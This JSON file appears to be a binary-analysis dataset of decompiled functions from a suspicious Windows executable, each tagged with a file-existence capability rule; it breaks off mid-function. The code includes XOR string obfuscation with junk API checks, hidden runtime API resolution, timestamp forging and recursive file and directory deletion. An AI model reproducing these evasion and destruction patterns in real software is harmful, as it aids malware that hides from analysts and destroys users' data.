{
    "00401041": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401041(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.004010f5();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.00401167(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "00401167": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401167(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    uint var_8h;\n    \n    iVar3 = *0x41db50;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    var_8h = 0x16;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._2_2_ = uVar7 % 0x16 + 1;\n    var_1eh = uVar6 % 0x3b + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    var_1ch = uVar7 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar7 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x6504611c;\n    var_58h = 0x730f3920;\n    var_54h = 0x61504901;\n    var_50h = 0x396c6501;\n    var_4ch._0_2_ = 0x733d;\n    var_4ch._2_1_ = var_8h;\n    stack0xffffffb3 = 0x614049;\n    var_45h = 0x4393d65;\n    var_41h = 0xa490873;\n    var_3dh = 0x15654161;\n    var_39h = 0x8730239;\n    var_35h = 0x5d615d49;\n    var_31h = 0x19392c65;\n    var_2dh = 0x39490073;\n    var_29h = 0x61;\n    var_18h = 0x65736139;\n    var_14h._0_1_ = 0x49;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar4 != 0x8a0126) {\n            var_8h = 5;\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.004010f5();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1351
    },
    "00401397": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401397(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.004010f5();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x00401439;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x00401439;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00401439:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 603
    },
    "0040147b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040147b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t hFindFile;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar8 = 8;\n    var_20h = 0x104;\n    var_30h = fcn.004010f5();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar2 = (*pcVar6)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_14h != 0) {\n            uVar2 = (*pcVar6)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x5a4a3734;\n                hFindFile = 0x5a4a3768;\n                var_28h._0_2_ = 0x546f;\n                uVar2 = (*pcVar6)(8, 9);\n                uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_1ch = uVar3;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                    if (iVar4 != 0x49aedc) {\n                        var_24h = 0x6;\n                        *(iVar8 + uVar3) = *(&hFindFile + iVar8 % 6) ^ (iVar8 + uVar3)[&var_ch - uVar3];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_3ch = 0x4619591a;\n                var_38h = 0x33734678;\n                var_34h._0_2_ = 0x5646;\n                hFindFile = 0x46335946;\n                var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x56);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar4 = 0;\n                var_24h = &var_3ch - iVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n                    iVar1 = var_14h;\n                    if (iVar5 != 0xf5ec8d) {\n                        var_24h = 0x5;\n                        *(iVar4 + iVar8) = *(&hFindFile + iVar4 % 5) ^ *((&var_3ch - iVar8) + iVar4 + iVar8);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar8);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar1, lpFindFileData);\n                uVar3 = var_1ch;\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar4 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar2 = (*pcVar6)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                uVar2 = (*pcVar6)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar4 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040147b(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar4 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar4 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar4 != 0);\n                }\n                uVar2 = (*pcVar6)(0, iVar8);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, uVar3);\n                (*pcVar7)(uVar2);\n                uVar2 = (*pcVar6)(0, lpFindFileData);\n                (*pcVar7)(uVar2);\n                iVar8 = var_ch;\n            }\n            uVar2 = (*pcVar6)(0, var_14h);\n            (*pcVar7)(uVar2);\n        }\n        if (lpFileName != 0) {\n            uVar2 = (*pcVar6)(0, lpFileName);\n            (*pcVar7)(uVar2);\n        }\n    }\n    if (var_30h != 0) {\n        uVar2 = (*pcVar6)(0, var_30h);\n        (*pcVar7)(uVar2);\n    }\n    return iVar8;\n}\n",
        "token_count": 1811
    },
    "00401b49": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401b49(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00401b8b;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00401b8b:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.0040918d();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 641
    },
    "00402046": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402046(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00401b49();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "0040268f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040268f(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.004037f6();\n    if (iVar2 == 0) {\n        iVar2 = fcn.004091c0(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00409246(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41dad8 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040354e();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040354e();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 538
    },
    "00402db5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402db5(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_8h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00402d6c();\n    }\n    if (*0x41dae4 == NULL) {\n        var_34h = 0x342e153f;\n        var_30h = 0xd357a39;\n        var_2ch._0_2_ = 0x5826;\n        var_20h = 0x584a6151;\n        var_1ch._0_2_ = 0x5455;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_10h = 6;\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_ch = &var_34h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar4 != 0x4733ae) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_10h) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x3c3d033d;\n        var_4ch = 0x38405114;\n        var_48h = 0x22030236;\n        var_44h = 0x12172103;\n        var_40h._0_1_ = 0x15;\n        var_40h._1_1_ = 6;\n        var_40h._2_1_ = 0x1e;\n        var_3ch = 0x2a181b0a;\n        var_38h._0_2_ = 0x5355;\n        var_38h._2_1_ = 0x74;\n        var_20h = 0x536a7467;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 99);\n        var_40h._3_1_ = var_40h._1_1_;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_28h = 0;\n        iVar6 = 0;\n        var_ch = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x763a9e) {\n                var_10h = 5;\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[var_ch];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41dae4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41dae4 == NULL) goto code_r0x00402f63;\n    }\n    iVar3 = var_4h;\n    var_28h = 0;\n    iVar6 = (**0x41dae4)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x00402f63:\n    if (var_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1270
    },
    "00407b28": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407b28(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040e75a(iVar1, 0, &var_8h, &var_4h, 0x50);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.00409a4e();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 405
    },
    "004084f3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004084f3(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint8_t var_48h;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    int16_t *var_3bh;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x004087b6;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_47h = 0x69724357;\n        var_43h = 0x11573f6c;\n        var_3fh = 0x5a6c2272;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_14h = 6;\n        var_48h = 6;\n        var_3bh._0_1_ = 0x57;\n        var_34h = 0x7269575a;\n        var_30h._0_2_ = 0x6c47;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        unique0x100002b6 = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0x9ac1b1) {\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % var_14h) ^ (iVar5 + piVar6)[&var_48h + -piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x00408788:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_24h == NULL) {\n                var_1ch = fcn.00405c5a();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00405c5a();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto 